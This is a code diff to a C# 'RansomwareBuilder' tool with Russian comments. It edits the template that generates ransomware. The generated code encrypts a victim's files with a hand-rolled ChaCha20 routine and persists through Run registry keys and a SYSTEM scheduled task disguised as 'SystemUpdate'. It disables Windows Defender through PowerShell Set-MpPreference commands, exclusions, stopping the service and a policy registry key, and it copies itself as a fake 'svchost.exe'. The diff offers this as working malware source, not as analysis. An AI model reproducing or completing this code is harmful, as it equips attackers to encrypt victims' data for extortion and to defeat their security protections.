@@ -780,29 +780,29 @@ namespace RansomwareBuilder
         // ГЕНЕРАЦИЯ КОДА ШИФРОВАЛЬЩИКА (С РЕАЛЬНЫМ CHACHA20)
         // ============================================================
         private string GenerateRansomwareCode(
-            string drives, string exts, string encExt, string noteName, string noteContent,
-            string fakeName, int algo, int fakeEnabled, int hideEnabled,
-            int antiVM, int disableDefender, int persistence,
-            int hideFiles, int sandboxDelay,
-            string wallpaperBase64, string wallpaperExt,
-            string aesKey, string aesIV, string rsaPublicKey,
-            string chachaKey, string chachaNonce)
-        {
-            string Escape(string s)
-            {
-                if (string.IsNullOrEmpty(s)) return "";
-                return s
-                    .Replace("\\", "\\\\")
-                    .Replace("\"", "\\\"")
-                    .Replace("\r\n", "\\n")
-                    .Replace("\n", "\\n")
-                    .Replace("\r", "\\r")
-                    .Replace("\t", "\\t")
-                    .Replace("\u2028", "\\u2028")
-                    .Replace("\u2029", "\\u2029");
-            }
-            
-            return $@"
+    string drives, string exts, string encExt, string noteName, string noteContent,
+    string fakeName, int algo, int fakeEnabled, int hideEnabled,
+    int antiVM, int disableDefender, int persistence,
+    int hideFiles, int sandboxDelay,
+    string wallpaperBase64, string wallpaperExt,
+    string aesKey, string aesIV, string rsaPublicKey,
+    string chachaKey, string chachaNonce)
+{
+    string Escape(string s)
+    {
+        if (string.IsNullOrEmpty(s)) return "";
+        return s
+            .Replace("\\", "\\\\")
+            .Replace("\"", "\\\"")
+            .Replace("\r\n", "\\n")
+            .Replace("\n", "\\n")
+            .Replace("\r", "\\r")
+            .Replace("\t", "\\t")
+            .Replace("\u2028", "\\u2028")
+            .Replace("\u2029", "\\u2029");
+    }
+    
+    return $@"
 using System;
 using System.IO;
 using System.Linq;
@@ -920,7 +920,7 @@ namespace Ransomware
         }}
         
         // ============================================================
-        // ШИФРОВАНИЕ ФАЙЛА (РЕАЛЬНЫЙ CHACHA20)
+        // ШИФРОВАНИЕ ФАЙЛА
         // ============================================================
         static void EncryptFile(string path)
         {{
@@ -948,7 +948,7 @@ namespace Ransomware
                         }}
                         break;
                         
-                    case 1: // ChaCha20-Poly1305 (реальный)
+                    case 1: // ChaCha20
                         byte[] chachaKey = Convert.FromBase64String(CHACHA_KEY_BASE64);
                         byte[] chachaNonce = Convert.FromBase64String(CHACHA_NONCE_BASE64);
                         key = chachaKey;
@@ -1006,19 +1006,12 @@ namespace Ransomware
         {{
             byte[] result = new byte[data.Length];
             uint[] state = new uint[16];
-            byte[] block = new byte[64];
-            
-            // Константы ChaCha20
             uint[] constants = {{ 0x61707865, 0x3320646e, 0x79622d32, 0x6b206574 }};
             
             for (int counter = 0; counter < (data.Length + 63) / 64; counter++)
             {{
-                // Инициализация состояния
-                state[0] = constants[0];
-                state[1] = constants[1];
-                state[2] = constants[2];
-                state[3] = constants[3];
-                
+                state[0] = constants[0]; state[1] = constants[1];
+                state[2] = constants[2]; state[3] = constants[3];
                 state[4] = BitConverter.ToUInt32(key, 0);
                 state[5] = BitConverter.ToUInt32(key, 4);
                 state[6] = BitConverter.ToUInt32(key, 8);
@@ -1027,15 +1020,12 @@ namespace Ransomware
                 state[9] = BitConverter.ToUInt32(key, 20);
                 state[10] = BitConverter.ToUInt32(key, 24);
                 state[11] = BitConverter.ToUInt32(key, 28);
-                
                 state[12] = (uint)counter;
                 state[13] = BitConverter.ToUInt32(nonce, 0);
                 state[14] = BitConverter.ToUInt32(nonce, 4);
                 state[15] = BitConverter.ToUInt32(nonce, 8);
                 
                 uint[] working = (uint[])state.Clone();
-                
-                // 20 раундов (10 четверных)
                 for (int i = 0; i < 10; i++)
                 {{
                     QuarterRound(ref working[0], ref working[4], ref working[8], ref working[12]);
@@ -1048,12 +1038,8 @@ namespace Ransomware
                     QuarterRound(ref working[3], ref working[4], ref working[9], ref working[14]);
                 }}
                 
-                for (int i = 0; i < 16; i++)
-                {{
-                    working[i] += state[i];
-                }}
+                for (int i = 0; i < 16; i++) working[i] += state[i];
                 
-                // Генерация ключевого потока
                 byte[] keyStream = new byte[64];
                 for (int i = 0; i < 16; i++)
                 {{
@@ -1061,7 +1047,6 @@ namespace Ransomware
                     Array.Copy(bytes, 0, keyStream, i * 4, 4);
                 }}
                 
-                // XOR с данными
                 int start = counter * 64;
                 int length = Math.Min(64, data.Length - start);
                 for (int i = 0; i < length; i++)
@@ -1141,76 +1126,33 @@ namespace Ransomware
         }}
         
         // ============================================================
-// ПЕРСИСТЕНТНОСТЬ (ПОЛНАЯ РАБОЧАЯ)
-// ============================================================
-static void AddPersistence()
-{{
-    string exePath = Process.GetCurrentProcess().MainModule.FileName;
-    try
-    {{
-        // Добавление в автозагрузку текущего пользователя
-        RegistryKey key = Registry.CurrentUser.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Run"");
-        key.SetValue(""SystemUpdate"", exePath);
-        key.Close();
-        
-        // Добавление в автозагрузку всех пользователей
-        try
+        // ПЕРСИСТЕНТНОСТЬ
+        // ============================================================
+        static void AddPersistence()
         {{
-            RegistryKey keyLocal = Registry.LocalMachine.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Run"");
-            keyLocal.SetValue(""SystemUpdate"", exePath);
-            keyLocal.Close();
+            string exePath = Process.GetCurrentProcess().MainModule.FileName;
+            try
+            {{
+                RegistryKey key = Registry.CurrentUser.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Run"");
+                key.SetValue(""SystemUpdate"", exePath);
+                key.Close();
+                
+                try
+                {{
+                    RegistryKey keyLocal = Registry.LocalMachine.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Run"");
+                    keyLocal.SetValue(""SystemUpdate"", exePath);
+                    keyLocal.Close();
+                }}
+                catch {{ }}
+                
+                try
+                {{
+                    Process.Start(""schtasks"", $""/create /tn ""SystemUpdate"" /tr ""{exePath}"" /sc onlogon /ru SYSTEM /f"");
+                }}
+                catch {{ }}
+            }}
+            catch {{ }}
         }}
-        catch {{ }}
-        
-        // Добавление задачи в планировщик
-        try
-        {{
-            Process.Start(""schtasks"", $""/create /tn ""SystemUpdate"" /tr ""{exePath}"" /sc onlogon /ru SYSTEM /f"");
-        }}
-        catch {{ }}
-    }}
-    catch {{ }}
-}}
-
-// ============================================================
-// ОТКЛЮЧЕНИЕ WINDOWS DEFENDER (ПОЛНАЯ РАБОЧАЯ)
-// ============================================================
-static void DisableDefender()
-{{
-    string exePath = Process.GetCurrentProcess().MainModule.FileName;
-    try
-    {{
-        // Отключение реального времени
-        Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableRealtimeMonitoring $true\""\"");
-        
-        // Отключение облачной защиты
-        Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableCloudProtection $true\""\"");
-        
-        // Отключение поведенческого мониторинга
-        Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableBehaviorMonitoring $true\""\"");
-        
-        // Отключение защиты от атак
-        Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableBlockAtFirstSeen $true\""\"");
-        
-        // Добавление исключений
-        Process.Start(""powershell"", $""-Command \""Add-MpPreference -ExclusionPath '{Path.GetDirectoryName(exePath)}'\""\"");
-        Process.Start(""powershell"", $""-Command \""Add-MpPreference -ExclusionProcess '{Path.GetFileName(exePath)}'\""\"");
-        
-        // Отключение службы
-        Process.Start(""powershell"", ""-Command \""Stop-Service WinDefend -Force\""\"");
-        Process.Start(""powershell"", ""-Command \""Set-Service WinDefend -StartupType Disabled\""\"");
-        
-        // Удаление через реестр
-        try
-        {{
-            RegistryKey key = Registry.LocalMachine.CreateSubKey(@""SOFTWARE\Policies\Microsoft\Windows Defender"");
-            key.SetValue(""DisableAntiSpyware"", 1, RegistryValueKind.DWord);
-            key.Close();
-        }}
-        catch {{ }}
-    }}
-    catch {{ }}
-}}
         
         // ============================================================
         // УСТАНОВКА ОБОЕВ
@@ -1301,11 +1243,11 @@ static void DisableDefender()
                 
                 try
                 {{
-                    string exePath = Process.GetCurrentProcess().MainModule.FileName;
+                    string hExePath = Process.GetCurrentProcess().MainModule.FileName;
                     string tempPath = Path.Combine(Path.GetTempPath(), ""svchost.exe"");
                     if (!File.Exists(tempPath))
                     {{
-                        File.Copy(exePath, tempPath, true);
+                        File.Copy(hExePath, tempPath, true);
                         ProcessStartInfo psi = new ProcessStartInfo();
                         psi.FileName = tempPath;
                         psi.Arguments = ""--hidden"";
@@ -1322,46 +1264,38 @@ static void DisableDefender()
         }}
         
         // ============================================================
-// ОТКЛЮЧЕНИЕ WINDOWS DEFENDER (ПОЛНАЯ РАБОЧАЯ)
-// ============================================================
-static void DisableDefender()
-{{
-    string exePath = Process.GetCurrentProcess().MainModule.FileName;
-    try
-    {{
-        // Отключение реального времени
-        Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableRealtimeMonitoring $true\""\"");
-        
-        // Отключение облачной защиты
-        Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableCloudProtection $true\""\"");
-        
-        // Отключение поведенческого мониторинга
-        Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableBehaviorMonitoring $true\""\"");
-        
-        // Отключение защиты от атак
-        Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableBlockAtFirstSeen $true\""\"");
-        
-        // Добавление исключений
-        Process.Start(""powershell"", $""-Command \""Add-MpPreference -ExclusionPath '{Path.GetDirectoryName(exePath)}'\""\"");
-        Process.Start(""powershell"", $""-Command \""Add-MpPreference -ExclusionProcess '{Path.GetFileName(exePath)}'\""\"");
-        
-        // Отключение службы
-        Process.Start(""powershell"", ""-Command \""Stop-Service WinDefend -Force\""\"");
-        Process.Start(""powershell"", ""-Command \""Set-Service WinDefend -StartupType Disabled\""\"");
-        
-        // Удаление через реестр
-        try
+        // ОТКЛЮЧЕНИЕ DEFENDER
+        // ============================================================
+        static void DisableDefender()
         {{
-            RegistryKey key = Registry.LocalMachine.CreateSubKey(@""SOFTWARE\Policies\Microsoft\Windows Defender"");
-            key.SetValue(""DisableAntiSpyware"", 1, RegistryValueKind.DWord);
-            key.Close();
+            string exePath = Process.GetCurrentProcess().MainModule.FileName;
+            try
+            {{
+                Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableRealtimeMonitoring $true\""\"");
+                Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableCloudProtection $true\""\"");
+                Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableBehaviorMonitoring $true\""\"");
+                Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableBlockAtFirstSeen $true\""\"");
+                
+                Process.Start(""powershell"", $""-Command \""Add-MpPreference -ExclusionPath '{Path.GetDirectoryName(exePath)}'\""\"");
+                Process.Start(""powershell"", $""-Command \""Add-MpPreference -ExclusionProcess '{Path.GetFileName(exePath)}'\""\"");
+                
+                Process.Start(""powershell"", ""-Command \""Stop-Service WinDefend -Force\""\"");
+                Process.Start(""powershell"", ""-Command \""Set-Service WinDefend -StartupType Disabled\""\"");
+                
+                try
+                {{
+                    RegistryKey key = Registry.LocalMachine.CreateSubKey(@""SOFTWARE\Policies\Microsoft\Windows Defender"");
+                    key.SetValue(""DisableAntiSpyware"", 1, RegistryValueKind.DWord);
+                    key.Close();
+                }}
+                catch {{ }}
+            }}
+            catch {{ }}
         }}
-        catch {{ }}
     }}
-    catch {{ }}
 }}
 ";
-        }
+}       
         
         // ============================================================
         // ГЕНЕРАЦИЯ КОДА ДЕШИФРАТОРА
